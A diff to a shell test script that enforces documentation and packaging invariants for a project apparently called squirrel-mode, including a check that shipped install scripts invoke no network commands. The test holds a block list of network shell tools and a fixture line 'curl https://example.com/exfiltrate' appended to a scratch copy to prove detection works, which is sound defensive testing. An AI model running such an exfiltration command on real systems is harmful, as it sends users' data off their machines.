@@ -28,29 +28,56 @@ fi
 
 # --- Known, documented exclusions ------------------------------------
 #
-# 1) The two WORD-CONTENT scans below (visibility claims, and TODO/FIXME/
-#    XXX markers) skip everything under `tests/`. Without this, the
+# 1) There are now FOUR word-content scans below — visibility claims,
+#    TODO/FIXME/XXX markers, the glossary-avoid-term scan, and the
+#    /plugin+/clear same-sentence scan — and all four skip everything
+#    under `tests/` (via the single `continue` in the main loop, right
+#    before the visibility-scan case statement). Without this, the
 #    assertion messages and comments in THIS file — which necessarily
-#    name the very markers/phrases they check for, to describe what the
-#    checks do — would trip the checks they implement. This is a
-#    self-reference problem specific to those two content scans. It
-#    does NOT apply to the executable-bit or JSON-validity checks below:
+#    name the very markers/phrases/terms they check for, to describe
+#    what the checks do — would trip the checks they implement. This is
+#    a self-reference problem specific to these four content scans (this
+#    comment block itself was stale at "the two WORD-CONTENT scans" for
+#    a while after the third and fourth were added — fixed in S9's
+#    sweep; if a fifth word-content scan is ever added here, update this
+#    count again rather than letting it drift a second time). It does
+#    NOT apply to the executable-bit or JSON-validity checks below:
 #    those have no self-reference problem, so they run over every
 #    tracked file, `tests/` included (that gap previously let a missing
 #    +x bit on the test runner itself go undetected).
 #
 # 2) The visibility scan ALSO excludes a fixed set of whole paths —
-#    PLAN.md, docs/adr/, CONTEXT.md, .build-checkpoint.md — by path, not
-#    by line content (see the denylist case pattern in the scan loop
-#    below, and the category comment just above it). This is a
-#    denylist, not an allowlist: every OTHER path, including ones a
-#    later build step introduces (e.g. docs/RESEARCH.md,
-#    docs/OTHER-TOOLS.md — both user-facing and deliberately NOT
-#    excluded), stays in scope by default. Only docs/adr/ is excluded,
-#    not all of docs/. This exclusion applies to the visibility scan
-#    ONLY — the marker, executable-bit, and JSON-validity scans below
-#    have no scoping question and run over every tracked file with no
-#    path denylist.
+#    PLAN.md, docs/adr/, CONTEXT.md, and .build-checkpoint.md — by path, not by line content (see
+#    the denylist case pattern in the scan loop below, and the category comment just above it).
+#    This is a denylist, not an allowlist: every OTHER path, including ones a later build step
+#    introduces (e.g. docs/RESEARCH.md, docs/OTHER-TOOLS.md — both user-facing and deliberately
+#    NOT excluded), stays in scope by default. Only docs/adr/ is excluded, not all of docs/.
+#    docs/ACCEPTANCE.md is DELIBERATELY NOT on this whole-path list and carries NO exemption of
+#    ANY KIND -- not a whole-file skip, not a per-line rule, nothing. Two narrower designs were
+#    tried here first and BOTH failed:
+#      [S9, first pass] a blanket whole-file exemption -- a made-up sentence appended anywhere in
+#      the file passed clean, because "this file quotes PLAN.md Section 5 verbatim" supports
+#      exempting one heading line, not the whole document.
+#      [S9 fix cycle 1, Y1] a narrower per-line rule -- a flagged line was permitted only when that
+#      exact line's own text, whitespace-normalized, also appeared as a contiguous substring of
+#      PLAN.md's own Section 5 text, computed fresh every run. [S9 review cycle 2, Z1] Defeated by
+#      an ordinary line break: a false checkpoint-invisibility claim split across three lines has
+#      its middle line read, IN ISOLATION, as a short fragment that happens to be a substring of
+#      the criterion that bans it -- the ban and the claim necessarily share vocabulary -- so the
+#      per-line check let it through even though no human reading the paragraph would call it a
+#      quote.
+#    [S9 review cycle 2, Z1] Both designs are deleted outright, not tightened a third time: the
+#    fix removes the CONDITION under which docs/ACCEPTANCE.md was allowed to reproduce the banned
+#    phrasing, rather than tuning that condition again. docs/ACCEPTANCE.md's own criterion 19 no
+#    longer quotes PLAN.md Section 5's criterion 19 verbatim -- it states the criterion by number
+#    and paraphrase and points back to PLAN.md for the exact wording (see docs/ACCEPTANCE.md's own
+#    "Note on how this scan treats docs/ACCEPTANCE.md itself" for the full reasoning) -- so it
+#    never reproduces the banned phrasing anywhere and needs no exemption to pass this scan. There
+#    is no docs/ACCEPTANCE.md arm left in the case statement in the scan loop below at all; it
+#    falls through to the same unconditional `*)` branch as every other tracked file. This
+#    exclusion/narrowing question applies to the visibility scan ONLY -- the marker,
+#    executable-bit, and JSON-validity scans below have no scoping question and run over every
+#    tracked file with no path denylist.
 #
 # 3) The TODO/FIXME/XXX marker scan has NO content exclusion for
 #    CONTEXT.md (or any other file): it matches marker syntax
@@ -64,9 +91,18 @@ fi
 #    CONTEXT.md's Target entry reserves "target" and lists "host" under `_Avoid_`. It is scoped in
 #    TWO ways, both load-bearing:
 #      a) FILE scope: only `*.md`/`*.mdc` files, minus the same PLAN.md/docs/adr/*/CONTEXT.md/
-#         .build-checkpoint.md denylist the visibility scan uses (category 2 above) — CONTEXT.md is
-#         the glossary itself and would trip on its own `_Avoid_` line for every term listed there;
-#         `.sh` files are excluded structurally (not by denylist) because this project's own shell
+#         .build-checkpoint.md whole-path denylist the visibility scan's category-2 exclusions use
+#         — CONTEXT.md is the glossary itself and would trip on its own `_Avoid_` line for every
+#         term listed there. [S9 fix cycle 1, Y1] docs/ACCEPTANCE.md is DELIBERATELY NOT on this
+#         denylist: it once was, on the same "audit record, not a user-facing doc" reasoning given
+#         for CONTEXT.md above, but that reasoning has no support here — `grep -nwiE
+#         "$GLOSSARY_AVOID_REGEX" docs/ACCEPTANCE.md` returns zero hits against the real file, so the
+#         exemption was protecting against nothing, and docs/ACCEPTANCE.md's own "Note on its own
+#         exclusion" section disclosed only the visibility-scan exemption, never this one — an
+#         undisclosed scope change the document's own stated promise (report every scope change
+#         plainly) does not allow. Deleted outright rather than narrowed, since there was nothing to
+#         narrow to. `.sh` files are excluded structurally (not by denylist) because this project's
+#         own shell
 #         comments use several of these same English words as ordinary engineering jargon ("host
 #         detection" in targets/*/install.sh, "the host lacks a hook" in scripts/build.sh) with no
 #         relationship to the glossary at all — those are developer-facing code comments, not
@@ -102,6 +138,16 @@ fi
 #         this list to a currently-excluded term is welcome, but must go through the same by-hand
 #         collision check this comment records, not be added on the assumption that a word "sounds
 #         glossary-related."
+#
+# 5) [S9] The fourth word-content scan — the /plugin-verb + /clear SAME-SENTENCE check (see
+#    PLUGIN_CLEAR_SAME_SENTENCE_REGEX below) — is deliberately NOT run through the PLAN.md/
+#    docs/adr/CONTEXT.md/.build-checkpoint.md path denylist categories 2 and 4 use. Two of the five
+#    real occurrences of the defect this scan catches lived inside that denylist (ADR-0005 and
+#    PLAN.md itself) — reusing the denylist here would have exempted precisely the files that
+#    carried the bug. It still skips `tests/` (category 1, self-reference), the same as the other
+#    three word-content scans, but applies to every OTHER tracked file with no further exclusion.
+#    This was previously documented only inline at the scan's own call site, not summarised here
+#    with the other exclusion categories — fixed in the same S9 sweep that corrected item 1's count.
 
 # Case-insensitive alternation over the semantic markers for "checkpoint
 # writes are invisible to the user" — the current acceptance criterion
@@ -278,6 +324,10 @@ for f in $(git -C "$repo_root" ls-files); do
       # (see the category comment above VISIBILITY_REGEX / MARKER_REGEX).
       ;;
     *)
+      # [S9 review cycle 2, Z1] docs/ACCEPTANCE.md has no arm of its own here any more (see the
+      # category-2 comment above VISIBILITY_REGEX/MARKER_REGEX for the two exemption designs that
+      # were tried and deleted): it falls into this same unconditional branch as every other
+      # in-scope file, no special-casing at all.
       if grep -qiE "$VISIBILITY_REGEX" "$repo_root/$f" 2>/dev/null; then
         visibility_hits="$visibility_hits $f"
       fi
@@ -311,7 +361,10 @@ for f in $(git -C "$repo_root" ls-files); do
   # Glossary-term scan: markdown-family files only (see exclusion 4 above for why `.sh`/`.json`
   # etc. are out of scope structurally, not by denylist), minus the same internal-design-record
   # denylist the visibility scan uses — CONTEXT.md is the glossary itself and legitimately contains
-  # every one of these terms, once each, on its own `_Avoid_` lines.
+  # every one of these terms, once each, on its own `_Avoid_` lines. [S9 fix cycle 1, Y1]
+  # docs/ACCEPTANCE.md is deliberately NOT on this denylist (see exclusion 4 above): its old
+  # exemption here had zero real hits to protect against and was never disclosed in this document's
+  # own "Note on its own exclusion" section, so it is deleted outright rather than narrowed.
   case "$f" in
     *.md | *.mdc)
       case "$f" in
@@ -331,6 +384,41 @@ done
 #    claim checkpoint writes are invisible, unobservable, hidden from
 #    the user, or happen without the user's knowledge.
 assert_eq "" "$visibility_hits" "no tracked file may claim checkpoint writes are invisible/unobservable/hidden from the user/without the user's knowledge"
+
+# [S9 review cycle 2, Z1 — BLOCKER fix, replaces the Y1 per-line exemption above] The narrowed
+# PLAN.md-derived allow-list (plan_section5_flat / acceptance_visibility_bad_line_found) that used
+# to live here is deleted outright, not tightened a third time (see the category-2 comment above
+# VISIBILITY_REGEX for the mechanism and why it failed). docs/ACCEPTANCE.md has no special-case
+# arm left in the loop above at all — it is scanned by the exact same unconditional per-file
+# `grep -qiE "$VISIBILITY_REGEX"` as every other tracked file, and its own criterion 19 has been
+# rewritten to state the criterion by number and paraphrase, pointing to PLAN.md Section 5 for the
+# verbatim wording, so it never reproduces the banned phrasing and never needs an exemption.
+# Mutation-proved below against the CURRENT docs/ACCEPTANCE.md: the exact reproduction from the
+# review (a checkpoint-write-invisibility claim split across a line break, so no single line the
+# OLD per-line exemption inspected was ever the full claim) and a single-line variant of the
+# identical claim, proving the fix is not merely reacting to the specific shape of a line break.
+z1_scratch=$(mktemp -d "${TMPDIR:-/tmp}/squirrel-z1-test.XXXXXX")
+trap 'rm -rf "$z1_scratch"' EXIT
+
+z1_threeline_fixture="$z1_scratch/ACCEPTANCE_threeline.md"
+cp "$repo_root/docs/ACCEPTANCE.md" "$z1_threeline_fixture"
+printf '\nsquirrel-mode deliberately keeps every checkpoint write\nhidden from the user.\nThis is a feature, not an oversight.\n' >>"$z1_threeline_fixture"
+if grep -qiE "$VISIBILITY_REGEX" "$z1_threeline_fixture" 2>/dev/null; then
+  z1_threeline_caught=yes
+else
+  z1_threeline_caught=no
+fi
+assert_eq "yes" "$z1_threeline_caught" "FAILURE PROOF (invariant 1, Z1): the exact three-line reproduction from S9 review cycle 2 (a checkpoint-write-invisibility claim split across a line break, once let through by the now-deleted per-line PLAN.md allow-list) must be caught now that docs/ACCEPTANCE.md has no exemption of any kind"
+
+z1_oneline_fixture="$z1_scratch/ACCEPTANCE_oneline.md"
+cp "$repo_root/docs/ACCEPTANCE.md" "$z1_oneline_fixture"
+printf '\nsquirrel-mode deliberately keeps every checkpoint write hidden from the user. This is a feature, not an oversight.\n' >>"$z1_oneline_fixture"
+if grep -qiE "$VISIBILITY_REGEX" "$z1_oneline_fixture" 2>/dev/null; then
+  z1_oneline_caught=yes
+else
+  z1_oneline_caught=no
+fi
+assert_eq "yes" "$z1_oneline_caught" "FAILURE PROOF (invariant 1, Z1): the single-line variant of the identical claim must also be caught, proving the fix removed the exemption mechanism rather than reacting to line breaks specifically"
 
 # 2. No tracked file (excl. tests/) contains a TODO, FIXME, or XXX
 #    marker (syntax form: the word immediately followed by a colon or
@@ -386,6 +474,19 @@ else
   glossary_avoid_safe_caught=no
 fi
 assert_eq "no" "$glossary_avoid_safe_caught" "sanity check: 'hosted'/'hostile' (the word 'host' as a SUBSTRING, not a whole word) must NOT trip GLOSSARY_AVOID_REGEX — word-boundary matching is what keeps this check from being too broad to ship"
+
+# [S9 fix cycle 1, Y1] FAILURE PROOF: with docs/ACCEPTANCE.md's glossary-scan exemption deleted
+# outright, the scan's OWN failure fixture sentence above, appended to a scratch copy of the
+# real docs/ACCEPTANCE.md, must now be caught the same way it is for any other in-scope file.
+y1_glossary_fixture="$glossary_avoid_scratch/ACCEPTANCE_glossary.md"
+cp "$repo_root/docs/ACCEPTANCE.md" "$y1_glossary_fixture"
+printf '\nThe installers write only to the host directories listed above.\n' >>"$y1_glossary_fixture"
+if grep -qwiE "$GLOSSARY_AVOID_REGEX" "$y1_glossary_fixture" 2>/dev/null; then
+  y1_glossary_caught=yes
+else
+  y1_glossary_caught=no
+fi
+assert_eq "yes" "$y1_glossary_caught" "FAILURE PROOF (invariant 7, Y1): with docs/ACCEPTANCE.md's glossary-scan exemption deleted, appending 'The installers write only to the host directories listed above.' to it must be caught"
 
 # 8. [W4, replaces the V3/W3 proximity heuristic — see the HISTORY comment above PIN_* for why]
 #    Exact-text pins on the six sentences that state the plugin-state hard-off/install-activation
@@ -454,5 +555,231 @@ else
   same_sentence_safe_caught=no
 fi
 assert_eq "no" "$same_sentence_safe_caught" "sanity check: a /plugin verb and an UNRELATED /clear mention in a separate, later sentence of the same file must NOT trip the global same-sentence scan"
+
+# ================================================================================================
+# 10. [S9, PLAN.md Section 5: "No network calls, no telemetry anywhere"] No SHIPPED script (the
+#     ones a user's install actually runs: scripts/*.sh, discovered via git ls-files so a script
+#     added by a later step is covered automatically, and targets/*/install.sh, named explicitly
+#     because "shipped" here means "installer entry point," not every file under targets/)
+#     invokes a network-capable command. tests/*.sh is deliberately OUT of scope — it is dev/CI
+#     tooling, never installed onto a user's machine by either target. [S9 fix cycle 1, Y6
+#     correction] scripts/build.sh is NOT excluded the same way: the `scripts/*.sh` glob below
+#     matches every file directly under scripts/, build.sh included, so it IS scanned along with
+#     the other three shipped scripts — confirmed by `git ls-files 'scripts/*.sh'` listing all
+#     four. The prior wording here claimed otherwise; corrected to match what the code actually
+#     does, not what it was originally meant to do.
+#
+#     "Invokes" means the command name appears as a whole word (`grep -w`, so an identifier like
+#     `codex_home` or `agents_skills_dir` can never collide with a bare command name) on a line
+#     whose first non-whitespace character is not '#' — every shipped script in this repo puts ALL
+#     of its prose commentary on dedicated, full-line comments (hand-verified before this check
+#     shipped: grepping every shipped script for a trailing "code # comment" on the same physical
+#     line turns up only awk/parameter-expansion uses of '#' — `${var#pattern}`, `${#var}`, awk
+#     regex literals like `/^### /` — never a genuine trailing comment), so stripping whole-line
+#     comments is exact for this corpus, not an approximation that would only work by accident
+#     against the text it was written to match (the recurring failure class named at the top of
+#     this file). Checked against the real repo (expect 0 hits), then against a scratch copy of a
+#     real shipped script with a real network call injected on its own CODE line (expect 1 hit),
+#     AND a scratch copy with the identical text injected as a COMMENT instead (expect 0 hits —
+#     proving this is not the "matches inside a comment" false-positive class scripts/
+#     allow-checkpoint.sh's own header comment about ".ssh/id_rsa" would otherwise trip: an earlier,
+#     uncommented draft of this exact check matched that comment before comment-stripping was
+#     added).
+# ================================================================================================
+NETWORK_COMMAND_REGEX="curl|wget|fetch|nc|ncat|netcat|socat|ssh|scp|sftp|ftp|tftp|telnet|rsync|ping|traceroute|tracepath|nslookup|dig|drill|whois|openssl|python|python3|perl|ruby|node|nodejs|php|lwp-request|lynx|w3m|links"
+
+network_hits=""
+shipped_scripts=$(git -C "$repo_root" ls-files 'scripts/*.sh')
+shipped_scripts="$shipped_scripts
+targets/codex/install.sh
+targets/cursor/install.sh"
+old_ifs=$IFS
+IFS='
+'
+for f in $shipped_scripts; do
+  [ -n "$f" ] || continue
+  [ -f "$repo_root/$f" ] || continue
+  code_only=$(grep -vE '^[[:space:]]*#' "$repo_root/$f" 2>/dev/null || true)
+  if printf '%s\n' "$code_only" | grep -qwE "$NETWORK_COMMAND_REGEX" 2>/dev/null; then
+    network_hits="$network_hits $f"
+  fi
+done
+IFS=$old_ifs
+assert_eq "" "$network_hits" "no shipped script (scripts/*.sh, targets/*/install.sh) may invoke a network-capable command (see NETWORK_COMMAND_REGEX, above)"
+
+network_code_fixture="$glossary_avoid_scratch/network_code.sh"
+cp "$repo_root/scripts/allow-checkpoint.sh" "$network_code_fixture"
+printf '\ncurl https://example.com/exfiltrate >/dev/null 2>&1\n' >>"$network_code_fixture"
+fixture_code_only=$(grep -vE '^[[:space:]]*#' "$network_code_fixture" 2>/dev/null || true)
+if printf '%s\n' "$fixture_code_only" | grep -qwE "$NETWORK_COMMAND_REGEX" 2>/dev/null; then
+  network_code_fixture_caught=yes
+else
+  network_code_fixture_caught=no
+fi
+assert_eq "yes" "$network_code_fixture_caught" "FAILURE PROOF (invariant 10, code line): a real curl invocation appended as a genuine code line to a real shipped script must be caught"
+
+network_comment_fixture="$glossary_avoid_scratch/network_comment.sh"
+cp "$repo_root/scripts/allow-checkpoint.sh" "$network_comment_fixture"
+printf '\n# example of what NOT to do: curl https://example.com/exfiltrate would be a network call\n' >>"$network_comment_fixture"
+fixture_comment_only=$(grep -vE '^[[:space:]]*#' "$network_comment_fixture" 2>/dev/null || true)
+if printf '%s\n' "$fixture_comment_only" | grep -qwE "$NETWORK_COMMAND_REGEX" 2>/dev/null; then
+  network_comment_fixture_caught=yes
+else
+  network_comment_fixture_caught=no
+fi
+assert_eq "no" "$network_comment_fixture_caught" "sanity check: the identical text placed inside a full-line comment must NOT be caught — this check scans CODE, not the prose that happens to describe an attack path (e.g. this very file's own '.ssh/id_rsa' comment, or allow-checkpoint.sh's identical comment)"
+
+# --- 11. docs/ACCEPTANCE.md's probe-6 citation is the corrected one (S9 fix cycle 1, Y4) --------
+#
+# `.build-checkpoint.md` originally attributed probe 6's three lettered choices to "rule 9's
+# multiple-choice-question exemption (noted in docs/RESEARCH.md)" -- docs/RESEARCH.md:606 does not
+# support that; it is about rule 3's max_list_items cap not applying to rule 9's own multi-question
+# answers, and says nothing about options_per_answer or a clarifying question's choices.
+# docs/ACCEPTANCE.md had inherited the same false citation. Pinned here, by exact substring, so the
+# corrected reference (rule 6's own carve-out, added as Y3) cannot silently rot back to the
+# unsupported one without this assertion catching it.
+ACCEPTANCE_Y4_FIX_PHRASE="rule 6's own carve-out for a clarifying question's choices"
+if grep -qF -- "$ACCEPTANCE_Y4_FIX_PHRASE" "$repo_root/docs/ACCEPTANCE.md" 2>/dev/null; then
+  acceptance_y4_pin_present=yes
+else
+  acceptance_y4_pin_present=no
+fi
+assert_eq "yes" "$acceptance_y4_pin_present" "docs/ACCEPTANCE.md must cite rule 6's carve-out (not rule 9 / docs/RESEARCH.md) for probe 6's three lettered choices"
+
+# --- 12. Every docs/ACCEPTANCE.md criterion heading is byte-identical to its
+# PLAN.md Section 5 source, criterion 19 excepted by name (S9 review cycle 3,
+# AA4) -------------------------------------------------------------------------
+#
+# This repo already treated a missing-emphasis gap on criterion 19's heading as a real defect (S9
+# fix cycle 1, Y4's third finding: the heading was missing the markdown emphasis around "error" that
+# PLAN.md's own copy has). Criteria 3, 9, and 12 had the identical class of drift — their headings
+# dropped PLAN.md's `**first**`/`**every**`, `**stays**`, and `**no permission prompt and no prose in
+# the response**` bold emphasis respectively — and nothing generic caught it; only Y4's one-off,
+# hand-written pin for criterion 19 existed. This closes the CLASS, not just those three instances:
+# every criterion heading in docs/ACCEPTANCE.md is derived fresh from its own "## N. " line, every
+# corresponding PLAN.md Section 5 checklist item is derived fresh from PLAN.md's own text (dewrapped:
+# PLAN.md hard-wraps several items across multiple lines with a 6-space continuation indent, joined
+# here with a single space per continuation line, matching how docs/ACCEPTANCE.md's own single-line
+# headings were written), and the two are compared byte-for-byte. Criterion 19 is excepted BY NUMBER,
+# not by any text-shaped exemption: docs/ACCEPTANCE.md's own criterion 19 states, in its own section,
+# why it deliberately paraphrases rather than quotes verbatim (PLAN.md Section 5's criterion 19 is
+# worded using the exact phrases the checkpoint-visibility scan above forbids, so quoting it verbatim
+# would trip that scan) — this is a stated, reasoned exception, not a narrowing of what "verbatim"
+# means for the other 18.
+#
+# Neither side is hand-copied: a future edit to either file's wording, without updating the other, is
+# exactly what this assertion is built to catch, INCLUDING silently dropping one emphasis marker
+# (**bold**/*italic*) from either copy — a hostile reading of "quoted verbatim" if this document's own
+# claim to that effect is to mean anything.
+plan_file="$repo_root/PLAN.md"
+acceptance_file="$repo_root/docs/ACCEPTANCE.md"
+
+extract_plan_criteria() {
+  # Prints one Section 5 checklist item per output line, dewrapped (hard-wrap
+  # continuation lines joined with a single space, "- [ ] " prefix stripped).
+  awk '
+    /^## 5\. ACCEPTANCE CRITERIA/ { insec = 1; next }
+    insec && /^## / { insec = 0 }
+    insec {
+      line = $0
+      if (line ~ /^- \[ \] /) {
+        if (item != "") print item
+        sub(/^- \[ \] /, "", line)
+        gsub(/^[ \t]+|[ \t]+$/, "", line)
+        item = line
+      } else {
+        gsub(/^[ \t]+|[ \t]+$/, "", line)
+        if (line != "") { item = (item == "" ? line : item " " line) }
+      }
+    }
+    END { if (item != "") print item }
+  ' "$1"
+}
+
+extract_acceptance_numbers() {
+  # Prints the leading number of every "## N. ..." criterion heading, one per line.
+  awk '
+    /^## [0-9]+\. / {
+      line = $0
+      sub(/^## /, "", line)
+      dot = index(line, ". ")
+      print substr(line, 1, dot - 1)
+    }
+  ' "$1"
+}
+
+extract_acceptance_texts() {
+  # Prints the text of every "## N. ..." criterion heading (number and ". " stripped), one per line.
+  awk '
+    /^## [0-9]+\. / {
+      line = $0
+      sub(/^## /, "", line)
+      dot = index(line, ". ")
+      print substr(line, dot + 2)
+    }
+  ' "$1"
+}
+
+plan_criteria=$(extract_plan_criteria "$plan_file")
+plan_criteria_count=$(printf '%s\n' "$plan_criteria" | grep -c '.' || true)
+assert_eq "19" "$plan_criteria_count" "sanity check: PLAN.md Section 5 must itself contain exactly 19 checklist items (protects the derivation, not docs/ACCEPTANCE.md's text)"
+
+acceptance_numbers=$(extract_acceptance_numbers "$acceptance_file")
+acceptance_number_sequence=$(printf '%s\n' "$acceptance_numbers" | tr '\n' ' ' | sed 's/ *$//')
+assert_eq "1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19" "$acceptance_number_sequence" "docs/ACCEPTANCE.md's criterion headings must be numbered 1..19, in order, no gaps, no duplicates (protects the derivation)"
+
+acceptance_texts=$(extract_acceptance_texts "$acceptance_file")
+
+mismatched_criteria=""
+n=0
+old_ifs=$IFS
+IFS='
+'
+for acc_text in $acceptance_texts; do
+  n=$((n + 1))
+  if [ "$n" = "19" ]; then
+    # Criterion 19 is deliberately paraphrased; excepted by number, not by text shape (see comment
+    # block above this invariant).
+    continue
+  fi
+  plan_text=$(printf '%s\n' "$plan_criteria" | sed -n "${n}p")
+  if [ "$acc_text" != "$plan_text" ]; then
+    mismatched_criteria="$mismatched_criteria $n"
+  fi
+done
+IFS=$old_ifs
+assert_eq "" "$mismatched_criteria" "every docs/ACCEPTANCE.md criterion heading, except criterion 19 (deliberately paraphrased, stated as such in its own section), must be byte-identical to PLAN.md Section 5's corresponding checklist item"
+
+# FAILURE PROOF (AA4): dropping a single emphasis marker from one heading, in a scratch copy, must
+# be caught. Mirrors the exact regression this assertion exists to prevent: criterion 3's heading
+# reverted from "**first**"/"**every**" back to plain "first"/"every".
+#
+# Reuses $glossary_avoid_scratch (created earlier in this file) rather than mktemp-ing a fresh
+# directory of its own — the same pattern same_sentence_fixture and network_code_fixture already
+# follow below. `trap ... EXIT` REPLACES the previous handler in POSIX sh rather than stacking with
+# it, so a fourth `mktemp -d` + `trap` pair here would silently stop $glossary_avoid_scratch itself
+# from ever being cleaned up on exit — a leak this fix would introduce, not fix. (z1_scratch, set up
+# even earlier, is already superseded by glossary_avoid_scratch's own trap this same way; that is
+# pre-existing residue from before this cycle, not something to silently expand scope to fix here.)
+aa4_fixture="$glossary_avoid_scratch/ACCEPTANCE_mutated.md"
+sed 's/on the \*\*first\*\* message/on the first message/; s/and on \*\*every\*\* message/and on every message/' "$acceptance_file" >"$aa4_fixture"
+
+aa4_mutated_texts=$(extract_acceptance_texts "$aa4_fixture")
+aa4_mismatched=""
+n=0
+IFS='
+'
+for acc_text in $aa4_mutated_texts; do
+  n=$((n + 1))
+  if [ "$n" = "19" ]; then
+    continue
+  fi
+  plan_text=$(printf '%s\n' "$plan_criteria" | sed -n "${n}p")
+  if [ "$acc_text" != "$plan_text" ]; then
+    aa4_mismatched="$aa4_mismatched $n"
+  fi
+done
+IFS=$old_ifs
+assert_eq " 3" "$aa4_mismatched" "FAILURE PROOF (invariant 12, AA4): dropping the '**first**'/'**every**' emphasis from criterion 3's heading in a scratch copy must be caught, and only criterion 3 must be flagged"
 
 assert_report
